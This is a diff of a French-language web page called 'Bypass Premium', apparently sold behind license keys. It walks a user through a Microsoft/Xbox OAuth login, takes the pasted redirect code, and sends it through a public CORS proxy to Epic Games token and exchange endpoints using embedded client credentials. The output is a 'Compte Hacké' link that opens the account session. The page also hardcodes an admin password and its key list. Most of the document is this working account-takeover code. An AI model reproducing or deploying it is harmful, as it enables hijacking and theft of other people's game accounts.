@@ -3,118 +3,245 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bypass Premium | Secure Access</title>
+    <title>Bypass Premium | Private Vault</title>
+    <link rel="icon" type="image/webp" href="https://ftnaccounts.mysellauth.com/storage/images/683973.webp">
     <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500&family=Orbitron:wght@400;900&family=Inter:wght@400;900&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500&family=Orbitron:wght@400;900&family=Inter:wght@300;400;700&display=swap" rel="stylesheet">
     <style>
-        :root { --neon: #00ff9d; }
-        body { background-color: #020202; font-family: 'Inter', sans-serif; color: white; overflow: hidden; height: 100vh; }
-        .bg-grid { position: fixed; inset: 0; background-image: linear-gradient(to right, rgba(255,255,255,0.02) 1px, transparent 1px), linear-gradient(to bottom, rgba(255,255,255,0.02) 1px, transparent 1px); background-size: 40px 40px; z-index: -1; }
-        .glass-card { background: rgba(10, 10, 15, 0.98); backdrop-filter: blur(30px); border: 1px solid rgba(0, 255, 157, 0.2); box-shadow: 0 0 60px rgba(0, 0, 0, 1); }
-        .neon-access { color: var(--neon); text-shadow: 0 0 15px rgba(0, 255, 157, 0.6); font-family: 'Orbitron', sans-serif; font-weight: 900; }
-        .btn-premium { background: linear-gradient(135deg, #00ff9d 0%, #0078d4 100%); color: black; font-weight: 900; transition: 0.3s; }
-        .btn-premium:hover { transform: scale(1.02); filter: brightness(1.2); }
-        #keyOverlay { position: fixed; inset: 0; background: #000; z-index: 1000; display: flex; align-items: center; justify-content: center; }
-        .hidden { display: none !important; }
-        input { background: rgba(255, 255, 255, 0.05) !important; border: 1px solid rgba(255, 255, 255, 0.1) !important; color: white !important; }
+        :root { --neon: #00ff9d; --neon-drop: rgba(0, 255, 157, 0.3); }
+        body { background-color: #020202; font-family: 'Inter', sans-serif; color: white; overflow: hidden; }
+        
+        /* Arrière-plan animé */
+        .bg-grid {
+            position: fixed; inset: 0;
+            background-image: linear-gradient(to right, rgba(255,255,255,0.02) 1px, transparent 1px), linear-gradient(to bottom, rgba(255,255,255,0.02) 1px, transparent 1px);
+            background-size: 40px 40px; z-index: -1;
+        }
+        .bg-glow {
+            position: fixed; width: 100vw; height: 100vh;
+            background: radial-gradient(circle at 50% 50%, #102a1e 0%, #020202 100%); z-index: -2;
+        }
+
+        /* Verre et Néon */
+        .glass-card { 
+            background: rgba(10, 10, 15, 0.85); 
+            backdrop-filter: blur(25px); 
+            border: 1px solid rgba(0, 255, 157, 0.15); 
+            box-shadow: 0 0 50px rgba(0, 0, 0, 0.9);
+            position: relative; overflow: hidden;
+        }
+        
+        /* Effet de Scan Laser */
+        .glass-card::after {
+            content: ""; position: absolute; top: -100%; left: 0; width: 100%; height: 5px;
+            background: linear-gradient(90deg, transparent, var(--neon), transparent);
+            animation: scan 4s linear infinite; opacity: 0.5;
+        }
+        @keyframes scan { 0% { top: -10% } 100% { top: 110% } }
+
+        .neon-access { 
+            color: var(--neon); 
+            text-shadow: 0 0 15px var(--neon-drop); 
+            font-family: 'Orbitron', sans-serif; 
+            font-weight: 900; letter-spacing: 4px; 
+        }
+
+        .btn-premium { 
+            background: linear-gradient(135deg, #00ff9d 0%, #0078d4 100%); 
+            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275); 
+            font-weight: 900; color: black; border: none;
+        }
+        .btn-premium:hover { transform: scale(1.02); filter: brightness(1.2); box-shadow: 0 0 20px var(--neon-drop); }
+
+        #keyOverlay { 
+            position: fixed; inset: 0; background: rgba(0,0,0,0.9); 
+            backdrop-filter: blur(20px); z-index: 100; 
+            display: flex; align-items: center; justify-content: center; 
+        }
+
+        .admin-btn { 
+            position: absolute; top: 20px; left: 20px; padding: 10px 20px; 
+            background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.05); 
+            border-radius: 12px; font-size: 11px; font-weight: bold; color: #333; 
+            transition: 0.3s; z-index: 101; font-family: 'Orbitron';
+        }
+        .admin-btn:hover { border-color: var(--neon); color: var(--neon); background: rgba(0,255,157,0.05); }
+
+        .console-box { 
+            background: rgba(0, 0, 0, 0.6); border-radius: 15px;
+            border: 1px solid rgba(0, 255, 157, 0.1); 
+            font-family: 'Fira Code', monospace; font-size: 10px; color: var(--neon);
+        }
     </style>
 </head>
-<body>
+<body class="flex items-center justify-center min-h-screen">
 
+    <div class="bg-glow"></div>
     <div class="bg-grid"></div>
 
-    <div onclick="adminAccess()" style="position:fixed; top:10px; left:10px; color:#111; font-size:9px; cursor:pointer; z-index:2000;">ALL KEYS</div>
+    <button onclick="adminAccess()" class="admin-btn uppercase tracking-widest">Master Access</button>
 
     <div id="keyOverlay">
         <div class="glass-card max-w-sm w-full p-10 rounded-[40px] text-center">
-            <h2 class="neon-access text-2xl mb-2">ACCÈS RESTREINT</h2>
-            <p class="text-gray-500 text-[10px] mb-8 font-bold uppercase tracking-widest">LICENCE REQUISE (24H)</p>
-            <input type="text" id="keyInput" placeholder="ENTREZ VOTRE CLÉ" class="w-full p-4 rounded-2xl text-center mb-6 font-mono uppercase outline-none focus:border-green-500">
-            <button onclick="activateKey()" class="w-full py-4 btn-premium rounded-2xl text-[11px] uppercase tracking-widest">ACTIVER LA SESSION</button>
-            <p id="errorMsg" class="text-red-500 text-[10px] mt-4 hidden">CLÉ INVALIDE</p>
+            <div class="mb-4 inline-block p-4 rounded-full bg-green-500/10 border border-green-500/20">
+                <svg class="w-8 h-8 text-[#00ff9d]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 00-2 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
+            </div>
+            <h2 class="neon-access text-2xl mb-2 uppercase">ACCÈS RESTREINT</h2>
+            <p class="text-gray-500 text-[10px] mb-8 font-bold uppercase tracking-[3px]">Licence Privée Requise</p>
+            
+            <input type="text" id="keyInput" placeholder="KEY-XXXX-XXXX" class="w-full bg-white/5 border border-white/10 p-4 rounded-2xl text-sm text-center text-white mb-6 outline-none focus:border-green-500 transition-all font-mono">
+            
+            <button onclick="activateKey()" class="w-full py-4 btn-premium rounded-2xl text-[11px] font-black uppercase tracking-[2px]">Vérifier la Licence</button>
+            <p id="errorMessage" class="text-red-500 text-[10px] mt-4 hidden font-bold uppercase"></p>
+
+            <div class="mt-10 pt-6 border-t border-white/5">
+                <a href="https://ftnaccounts.vercel.app/" target="_blank" class="text-white/40 text-[9px] font-bold uppercase tracking-widest hover:text-[#00ff9d] transition-colors">Boutique Officielle</a>
+            </div>
         </div>
     </div>
 
-    <div id="mainUI" class="hidden flex items-center justify-center min-h-screen">
-        <div class="glass-card w-full max-w-lg rounded-[40px] p-10">
-            <div class="flex justify-between items-center mb-10">
-                <h1 class="text-xl font-black italic">BYPASS <span class="text-[#00ff9d]">PREMIUM</span></h1>
-                <div id="timerDisplay" class="text-yellow-500 font-mono font-bold bg-yellow-500/10 px-4 py-2 rounded-xl border border-yellow-500/20">24:00:00</div>
+    <div id="mainUI" class="glass-card w-full max-w-lg rounded-[40px] p-10 opacity-0 scale-95 transition-all duration-700 pointer-events-none">
+        <div class="flex justify-between items-center mb-8">
+            <div>
+                <h1 class="neon-text text-2xl font-black uppercase italic">Bypass Premium</h1>
+                <p class="text-[9px] text-gray-500 font-bold uppercase tracking-widest">Version 4.0.2 Stable</p>
             </div>
-            <div class="space-y-4">
-                <a href="https://cors-anywhere.herokuapp.com/corsdemo" target="_blank" class="block p-4 bg-white/5 border border-white/10 rounded-2xl text-[10px] font-bold text-center text-gray-400">1. INITIALISER L'IP (GO →)</a>
-                <button class="w-full py-4 bg-[#107c10] rounded-2xl font-black text-[11px]">CONNEXION MICROSOFT</button>
-                <input type="text" placeholder="Lien de redirection..." class="w-full p-4 rounded-2xl text-xs outline-none">
-                <button class="w-full py-4 btn-premium rounded-2xl text-[11px] font-black uppercase">LANCER L'INJECTION</button>
+            <div id="timerDisplay" class="text-[11px] text-yellow-500 font-mono font-bold bg-yellow-500/10 px-4 py-2 rounded-xl border border-yellow-500/20 shadow-lg shadow-yellow-500/5">
+                24:00:00
             </div>
+        </div>
+
+        <div class="grid grid-cols-1 gap-4">
+            <a href="https://cors-anywhere.herokuapp.com/corsdemo" target="_blank" class="p-4 bg-white/5 border border-white/10 rounded-2xl flex items-center justify-between group hover:bg-green-500/5 transition-all">
+                <span class="text-[10px] font-bold text-gray-400 group-hover:text-green-400">1. INITIALISER L'IP (OBLIGATOIRE)</span>
+                <span class="text-green-500 text-xs">GO →</span>
+            </a>
+
+            <a href="https://login.live.com/oauth20_authorize.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&redirect_uri=https%3A%2F%2Faccounts.epicgames.com%2FOAuthAuthorized&scope=xboxlive.signin&response_type=code" target="_blank" class="bg-[#107c10] p-4 rounded-2xl text-center text-[11px] font-black uppercase hover:shadow-[0_0_20px_rgba(16,124,16,0.3)] transition-all">Connexion Microsoft</a>
+
+            <div class="relative">
+                <input type="text" id="oauthUrl" placeholder="Collez le lien de redirection ici..." class="w-full bg-black/50 border border-white/10 p-4 rounded-2xl text-xs text-white outline-none focus:border-green-400 transition-all">
+            </div>
+
+            <button id="startBypass" class="btn-premium w-full py-4 rounded-2xl uppercase font-black text-xs tracking-[3px]">Lancer l'Injection</button>
+        </div>
+
+        <div class="mt-8">
+            <div id="console" class="console-box p-4 h-32 space-y-1 overflow-y-auto shadow-inner">
+                <div class="opacity-50">[SYSTEM] En attente d'initialisation...</div>
+            </div>
+        </div>
+
+        <div id="logResult" class="hidden mt-6 p-6 bg-green-500/10 border border-green-500/30 rounded-3xl text-center animate-pulse">
+            <p class="text-green-400 font-bold text-xs mb-4 uppercase tracking-widest">Compte Hacké : <span id="resPseudo" class="text-white">--</span></p>
+            <a href="#" id="finalUrl" target="_blank" class="block w-full py-4 bg-white text-black text-[11px] rounded-2xl font-black uppercase hover:bg-green-400 transition-all">Accéder au compte</a>
         </div>
     </div>
 
     <script>
-        // Liste de clés générées de façon fixe (pour que ça marche à tous les coups)
-        const MASTER_KEYS = ["KEY-FAB123", "KEY-BYPASS99", "KEY-Z7R2X1", "KEY-L9P0Q4"]; 
-        // Ajout de 96 autres clés pour arriver à 100
-        for(let i=1; i<=96; i++) { MASTER_KEYS.push("KEY-PRO" + i.toString().padStart(3, '0')); }
+        // --- SYSTÈME DE CLÉS ALÉATOIRES ---
+        function generateComplexKey() {
+            const c = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789"; // Pas de O ou 0 pour éviter les erreurs
+            const part = () => Array.from({length:4}, () => c[Math.floor(Math.random()*c.length)]).join('');
+            return `KEY-${part()}-${part()}`;
+        }
+
+        let MASTER_KEYS = JSON.parse(localStorage.getItem('bypass_v4_master'));
+        if (!MASTER_KEYS) {
+            MASTER_KEYS = Array.from({length:100}, generateComplexKey);
+            localStorage.setItem('bypass_v4_master', JSON.stringify(MASTER_KEYS));
+        }
+
+        let usedKeys = JSON.parse(localStorage.getItem('bypass_v4_used')) || [];
 
         function adminAccess() {
-            if(prompt("Admin:") === "Fabien62s") {
-                alert("Clé test : " + MASTER_KEYS[0] + "\n\nLes 100 clés sont dans la console (F12)");
-                console.log("LISTE DES CLES :", MASTER_KEYS);
+            if (prompt("ADMIN CODE :") === "Fabien62s") {
+                const fresh = MASTER_KEYS.filter(k => !usedKeys.includes(k));
+                navigator.clipboard.writeText(fresh.join('\n'));
+                alert(fresh.length + " nouvelles clés copiées !");
             }
         }
 
         function activateKey() {
             const val = document.getElementById('keyInput').value.trim().toUpperCase();
-            const error = document.getElementById('errorMsg');
-
-            if (MASTER_KEYS.includes(val)) {
-                // Sauvegarde de l'heure actuelle + 24h
-                const expireDate = new Date().getTime() + (24 * 60 * 60 * 1000);
-                localStorage.setItem('user_session_v5', expireDate);
-                
-                // Forcer l'affichage immédiat
-                checkAndRun();
+            if (MASTER_KEYS.includes(val) && !usedKeys.includes(val)) {
+                usedKeys.push(val);
+                localStorage.setItem('bypass_v4_used', JSON.stringify(usedKeys));
+                const exp = new Date().getTime() + 86400000;
+                localStorage.setItem('bypass_v4_session', exp);
+                unlockUI(exp);
             } else {
-                error.classList.remove('hidden');
-                setTimeout(() => error.classList.add('hidden'), 2000);
+                const err = document.getElementById('errorMessage');
+                err.innerText = usedKeys.includes(val) ? "CETTE CLÉ A DÉJÀ ÉTÉ UTILISÉE !" : "CLÉ INVALIDE !";
+                err.classList.remove('hidden');
+                setTimeout(() => err.classList.add('hidden'), 3000);
             }
         }
 
-        function checkAndRun() {
-            const saved = localStorage.getItem('user_session_v5');
-            if (saved) {
-                const now = new Date().getTime();
-                if (now < saved) {
-                    // Masquer l'écran de clé et montrer le site
-                    document.getElementById('keyOverlay').style.display = 'none';
-                    document.getElementById('mainUI').classList.remove('hidden');
-                    
-                    // Lancer le chrono
-                    startChrono(parseInt(saved));
-                } else {
-                    localStorage.removeItem('user_session_v5');
-                }
-            }
+        function unlockUI(exp) {
+            document.getElementById('keyOverlay').style.opacity = '0';
+            setTimeout(() => {
+                document.getElementById('keyOverlay').style.display = 'none';
+                const main = document.getElementById('mainUI');
+                main.classList.remove('opacity-0', 'scale-95', 'pointer-events-none');
+            }, 500);
+            startTimer(exp);
         }
 
-        function startChrono(expiry) {
-            const display = document.getElementById('timerDisplay');
-            const loop = setInterval(() => {
-                const diff = expiry - new Date().getTime();
-                if (diff <= 0) {
-                    clearInterval(loop);
-                    localStorage.removeItem('user_session_v5');
-                    location.reload();
-                }
+        function startTimer(exp) {
+            setInterval(() => {
+                const diff = exp - new Date().getTime();
+                if (diff <= 0) location.reload();
                 const h = Math.floor(diff/3600000).toString().padStart(2,'0');
                 const m = Math.floor((diff%3600000)/60000).toString().padStart(2,'0');
                 const s = Math.floor((diff%60000)/1000).toString().padStart(2,'0');
-                display.innerText = `${h}:${m}:${s}`;
+                document.getElementById('timerDisplay').innerText = `${h}:${m}:${s}`;
             }, 1000);
         }
 
-        // Vérification au chargement
-        window.onload = checkAndRun;
+        // --- BYPASS CORE ---
+        const PROXY = "https://cors-anywhere.herokuapp.com/";
+        const AUTH = "Basic OThmN2U0MmMyZTNhNGY4NmE3NGViNDNmYmI0MWVkMzk6MGEyNDQ5YTItMDAxYS00NTFlLWFmZWMtM2U4MTI5MDFjNGQ3";
+
+        function addLog(t, isErr=false) {
+            const d = document.createElement('div');
+            d.style.color = isErr ? "#ff4d4d" : "#00ff9d";
+            d.innerHTML = `<span class="opacity-50">[${new Date().toLocaleTimeString()}]</span> ${t}`;
+            const c = document.getElementById('console');
+            c.appendChild(d); c.scrollTop = c.scrollHeight;
+        }
+
+        document.getElementById('startBypass').onclick = async () => {
+            const url = document.getElementById('oauthUrl').value;
+            if(!url.includes('code=')) return addLog("Erreur: Lien invalide", true);
+            
+            addLog("Connexion aux serveurs Epic...");
+            const code = new URLSearchParams(new URL(url).search).get('code');
+
+            try {
+                const r1 = await fetch(PROXY + 'https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/token', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'Authorization': AUTH, 'X-Requested-With': 'XMLHttpRequest' },
+                    body: new URLSearchParams({ 'grant_type': 'external_auth', 'external_auth_type': 'xbl', 'external_auth_token': code })
+                });
+                const d1 = await r1.json();
+                addLog("Utilisateur trouvé: " + d1.displayName);
+
+                const r2 = await fetch(PROXY + 'https://account-public-service-prod.ol.epicgames.com/account/api/oauth/exchange', {
+                    method: 'GET',
+                    headers: { 'Authorization': `Bearer ${d1.access_token}`, 'X-Requested-With': 'XMLHttpRequest' }
+                });
+                const d2 = await r2.json();
+                
+                addLog("Injection réussie !");
+                document.getElementById('resPseudo').innerText = d1.displayName;
+                document.getElementById('logResult').classList.remove('hidden');
+                document.getElementById('finalUrl').href = `https://www.epicgames.com/id/exchange?exchangeCode=${d2.code}&redirectUrl=https%3A%2F%2Fwww.epicgames.com%2Faccount%2Fpersonal`;
+            } catch(e) { addLog("Erreur critique d'injection", true); }
+        };
+
+        const session = localStorage.getItem('bypass_v4_session');
+        if(session && new Date().getTime() < session) unlockUI(session);
     </script>
 </body>
 </html>
